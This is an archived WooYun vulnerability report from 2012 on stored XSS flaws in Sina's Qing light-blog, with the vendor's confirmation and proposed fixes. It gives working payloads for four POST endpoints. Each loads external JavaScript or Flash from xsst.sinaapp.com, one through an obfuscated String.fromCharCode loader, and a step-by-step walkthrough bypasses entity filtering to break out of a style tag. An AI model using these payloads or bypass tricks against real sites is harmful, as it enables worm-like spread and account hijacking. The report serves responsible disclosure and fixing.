@@ -1,0 +1,424 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪轻博客，满博尽是XSS....  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪轻博客，满博尽是XSS....  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-04 11:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-24：	细节向普通白帽子公开<br/>
+									2012-07-04：	细节向实习白帽子公开<br/>
+									2012-07-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">乌云上，已经有不少前人提交了轻博客的XSS。我在这里总结一下。<br />
+<br />
+http://www.wooyun.org/bugs/wooyun-2010-03926<br />
+音乐功能 screen参数双引号未过滤导致XSS<br />
+<br />
+http://www.wooyun.org/bugs/wooyun-2010-04682<br />
+评论处过滤不完善<br />
+<br />
+http://www.wooyun.org/bugs/wooyun-2010-05904<br />
+音乐功能某处参数输出未过滤导致XSS<br />
+<br />
+http://www.wooyun.org/bugs/wooyun-2010-06725<br />
+博客文章功能style未过滤expression<br />
+<br />
+<br />
+----------------------------------------------------<br />
+<br />
+昨晚我对轻博客的功能重新进行了测试。<br />
+<br />
+博客，照片，音乐，视频 4个功能， 有3个功能可导致存储型XSS。可导致蠕虫。<br />
+<br />
+另外【模板设置】处，也可导致存储型XSS，并可能导致用户被长久劫持。<br />
+<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">总体来说，经过之前的人提交BUG后，轻博客对双引号进行了过滤。<br />
+<br />
+<br />
+<br />
+但是轻博客，在前端，并非直接输出内容，而是通过.innerHTML=&quot;内容&quot;的方式输出。<br />
+<br />
+<br />
+<br />
+在这种情况下。<br />
+<br />
+<br />
+<br />
+.innerHTML=&#039;&lt;img src=&quot;&quot;&gt;&#039;;<br />
+<br />
+<br />
+<br />
+与<br />
+<br />
+<br />
+<br />
+.innerHTML=&#039;&lt;img src=&amp;quot;&amp;quot;&gt;&#039;;<br />
+<br />
+<br />
+<br />
+是等效的。<br />
+<br />
+<br />
+<br />
+而开发人员仅过滤了双引号，而没有过滤 &amp; ，从而导致了以下3处XSS的发生。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+1. 博客文章处XSS。cover参数未过滤<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qing.weibo.com/blog/api/artpost.php<br />
+<br />
+POST (仅提供缺陷参数，其它参数默认即可)<br />
+cover http://ww3.sinaimg.cn/mw600/a7ff28&amp;quot;80jw1dtlhke6xkjj.jpg/onerror=&amp;quot;Utils.Io.JsLoad.request(&amp;#x27;//xsst.sinaapp.com/m.js&amp;#x27;)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+以上代码调用外部JS。<br />
+<br />
+<br />
+<br />
+--------------------------------------------<br />
+<br />
+<br />
+<br />
+2. 发布视频XSS。swf参数未过滤。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qing.weibo.com/blog/api/videopost.php<br />
+<br />
+POST (仅提供缺陷参数，其它参数默认即可)<br />
+swf<br />
+http://xsst.sinaapp.com/Xss.swf&amp;quot;allowscriptaccess=&amp;quot;always&amp;quot;&gt;&lt;img/src=&amp;quot;&amp;quot;&gt;&lt;.swf</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+以上代码，调用外部swf<br />
+<br />
+<br />
+<br />
+--------------------------------------------<br />
+<br />
+<br />
+<br />
+3. 发布音乐XSS。shorturl参数未过滤<br />
+<br />
+<br />
+<br />
+音乐功能中的screen参数被WOOYUN其它人弄过( <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-03926">WooYun: 新浪轻博客跨站</a> ).<br />
+<br />
+<br />
+<br />
+因而我没有去测试该参数，而是直接测试其它参数，发现shorturl未过滤。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qing.weibo.com/blog/api/musicpost.php<br />
+<br />
+POST (仅提供缺陷参数，其它参数默认即可)<br />
+shorturl http://t.cn/zODGJj8&#039;&amp;quot;onload=&amp;quot;Utils.Io.JsLoad.request(&amp;#x27;//xsst.sinaapp.com/m.js&amp;#x27;)&amp;quot;a=&amp;quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+给个图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/041048358973f79156fb0d55a5f2b3e8843f042d.jpg" target="_blank"><img src="../images/041048358973f79156fb0d55a5f2b3e8843f042d.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+--------------------------------------------<br />
+<br />
+<br />
+<br />
+4. 模板设置处XSS。<br />
+<br />
+<br />
+<br />
+这一处，比较有点意思。 我们将模板设置为【日记本】这一款模板！<br />
+<br />
+<br />
+<br />
+抓包，可以得到POST的部分内容如下。<br />
+<br />
+<br />
+<br />
+</p><pre><code>css_data	image:上传背景图:http%3A//simg.sinajs.cn/xblogtheme/images/1/1_5/body_bg.png|color:背景色:%23fff|color:文字色:%23333|color:文字链接色:%23542B10</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到POST的数据中有背景图地址，然后查看轻微博的源码，可以看到该背景地址在以下位置输出：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;style type=&quot;text/css&quot;&gt;<br />
+body{background:#cfcfcf   url(http://simg.sinajs.cn/xblogtheme/images/1/1_5/body.png)   repeat;color:#333333;}<br />
+<br />
+....<br />
+&lt;/style&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+那么这个背景地址是否可以被我们修改呢？<br />
+<br />
+<br />
+<br />
+经过测试， 这个地址里不能含有 &quot;, &#039;,&lt;,&gt; 等字符，会提示“图片地址错误”<br />
+<br />
+<br />
+<br />
+但是如果是换成, &amp;quot;，不会提示图片错误了，但是双引号也会被过滤掉。<br />
+<br />
+<br />
+<br />
+但是如果是输入 &amp;#x61; 则会在输出里转换为 a;<br />
+<br />
+<br />
+<br />
+基于以上，我们可以推出大概的后端逻辑是：<br />
+<br />
+<br />
+<br />
+逻辑4-1<br />
+<br />
+<br />
+<br />
+</p><pre><code>A. 将HTML实体，如&amp;quot; &amp;nbsp; 转换为原字符<br />
+B. 将原字符里的双引号，单引号，空格等特殊字符过滤掉。<br />
+C. 判断是否仍然含有特殊字符，有则返回错误, 但是此处没有把&amp;列为特殊字符。</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+起初我只是想在CSS里用expression，但是想想这个方法，局限于IE6,7，8都有点悬，不好玩。。于是继续以下测试, 看看能不能输入一个&lt;/style&gt;来闭合css，然后在后面插入自己的HTML代码。<br />
+<br />
+<br />
+<br />
+A. 前面已经测试发现, &lt;, &gt; 被过滤<br />
+<br />
+B. 就算使用&amp;#x3C; &amp;#x3E;，也一样提示错误!<br />
+<br />
+C. 但是，当我直接&lt;/style&gt;来闭合css内容的时候，意外的发现&lt;/style&gt;被过滤掉了，没有提示&lt;,&gt; 相同的错误，这说明，&lt;/style&gt;标记被replace的优先级大于对&lt;,&gt; 的判断。<br />
+<br />
+D. 基于C, 我就想到了&amp;#x&lt;style&gt;3C;这样的方式，这样一来，我们可以躲避逻辑4-1;中的第一步，被replace掉&lt;style&gt;得到&amp;#x3C; 我最初也只是推测得到&amp;#x3C而已，但是结果输出了&lt; .. 看来逻辑里还少了些步骤，但是那不是我关心的事情了，既然可以这样输出&lt;，那我们可以构建以下代码，尝试输出&lt;/style&gt;<br />
+<br />
+<br />
+<br />
+</p><pre><code>&amp;#x&lt;style&gt;3C;/style&amp;#x&lt;style&gt;3E;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+E. 结果.. 还是悲剧了，再次被过滤为空，因而，这里肯定是一个循环判断。但是既然是会过滤&lt;/style&gt;，但是不一定会过滤&lt;/style空白字符&gt;的形式，由于空格会被过滤掉，这里的空白字符我们用tab来代替(0x09)。于是有了以下的形式。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&amp;#x&lt;style&gt;3C;/style&amp;#x&lt;style&gt;09;&amp;#x&lt;style&gt;3E;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+F. 这一次，成功输出了&lt;/style &gt;，闭合掉了css代码。<br />
+<br />
+<br />
+<br />
+G. 基于上面的步骤，我们可以进一步构造整个图片的代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http%3A//a.com/)&amp;#x&lt;style&gt;3C;/style&amp;#x&lt;style&gt;09;&amp;#x&lt;style&gt;3E;&amp;#x&lt;style&gt;3C;img/src&amp;#x&lt;style&gt;3D;1&amp;#x&lt;style&gt;09;onerror&amp;#x&lt;style&gt;3D;Utils.Io.JsLoad.request(/&amp;#x&lt;style&gt;5C;/&amp;#x&lt;style&gt;5C;/xsst.sinaapp.com&amp;#x&lt;style&gt;5C;/m.js/.source)&amp;#x&lt;style&gt;3E;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+H. 上面只是测试的代码，由于style位于所有被调用的JS之前，故我们不能使用新浪自带的Utils库，最后我们构造POST的利用数据如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qing.weibo.com/blog/api/mytplpost.php<br />
+POSTDATA (仅列出缺陷参数)<br />
+<br />
+css_data<br />
+<br />
+image:上传背景图:http%3A//a.com/)&amp;#x&lt;style&gt;3C;/style&amp;#x&lt;style&gt;09;&amp;#x&lt;style&gt;3E;&amp;#x&lt;style&gt;3C;img/src&amp;#x&lt;style&gt;3D;1&amp;#x&lt;style&gt;09;onerror&amp;#x&lt;style&gt;3D;(function()&amp;#x&lt;style&gt;7B;window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,116,46,115,105,110,97,97,112,112,46,99,111,109,47,109,46,106,115);document.body.appendChild(window.s);&amp;#x&lt;style&gt;7D;)()&amp;#x&lt;style&gt;3E;a.png|color:背景色:%23fff|color:文字色:%23333|color:文字链接色:%23542B10</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+I. 提交后，Chrome查看输出。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/04104704f39c7358d666ca8616d89b47297d3ab6.jpg" target="_blank"><img src="../images/04104704f39c7358d666ca8616d89b47297d3ab6.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+J: 效果见漏洞证明。  </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">1. 前面3处，可以造成蠕虫。<br />
+<br />
+<br />
+<br />
+2. 最后一处，把利用的代码再细化下，可以保证在用户的模板依然有效的情况下，对受害用户进行比较长期的劫持。<br />
+<br />
+<br />
+<br />
+3. 弹窗都长一个样。我就不每个都去截一个图了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/04104642c5794a8799014d4ba2f7a2dd4c2dc3e3.jpg" target="_blank"><img src="../images/04104642c5794a8799014d4ba2f7a2dd4c2dc3e3.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 前面3处是同一个问题，在用innerHTML输出时，将 &amp; replace 成 &amp;amp;<br />
+<br />
+<br />
+<br />
+2. 最后1处。。挺混乱，感觉过滤的逻辑过于复杂。就算是提供自定义背景，你们完全可以把图片地址控制在你们的域下，比如 http://www.sinaimg.cn/USERID/xxxxx.jpg，正则只需要判断过滤xxxxx的内容。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07856" title="新浪轻博客，满博尽是XSS....">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-06-04 11:16</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您对新浪的关注,我们立即修复.</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7856";
+var bugRating="2";
+var myRating="";
+var ratingCount="7";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
